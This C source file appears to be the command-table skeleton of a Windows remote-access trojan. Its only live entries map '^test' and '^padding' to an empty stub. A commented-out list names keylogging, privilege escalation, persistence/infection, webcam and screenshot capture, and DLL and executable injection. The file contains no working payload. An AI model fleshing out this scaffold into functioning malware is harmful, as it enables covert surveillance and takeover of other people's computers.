#include <windows.h>
#include <wchar.h>
//#include <shell32.h>
#include "include/cmd.h"


struct command commands[] = {
	{ "^test", &cc_test },
	{ "^padding", &cc_test }
};
	/*
	{ "^owned", &cc_owned }, 
	{ "^execute", &cc_execute }, 
	{ "^register", &cc_register },
	{ "^escalate", &cc_escalate },
	{ "^migration", &cc_migration }, 
	{ "^upload", &cc_upload },
	{ "^download", &cc_download },  
	{ "^keylogger", &cc_keylogger }, 
	{ "^process", &cc_process },
	{ "^ps", &cc_process },
	{ "^persistence", &cc_persistence }, 
	{ "^infect", &cc_persistence },
	{ "^screenshot", &cc_screenshot },
	{ "^exit", &cc_exit },
	{ "^webcam", &cc_webcam },
	{ "^tcp-scan", &cc_portscan },
	{ "^ping", &cc_portscan },
	{ "^netdiscover", &cc_portscan },
	{ "^load-dll", &cc_load_dll },
	{ "^load-exec", &cc_load_exe },
	{ "^inject-dll", &cc_inject_dll },
	{ "^inject-exec", &cc_inject_exe },
	{ "^computer-info", &cc_computer_info},
	{ "^cpuinfo", &cc_computer_info }*/



int cc_test(cmd_data *data) {
	
	return(0);
}

int command(WCHAR *raw) {
	WCHAR **argv;
	int argc;

	argv = CommandLineToArgvW(raw, &argc);



	return(0);

}
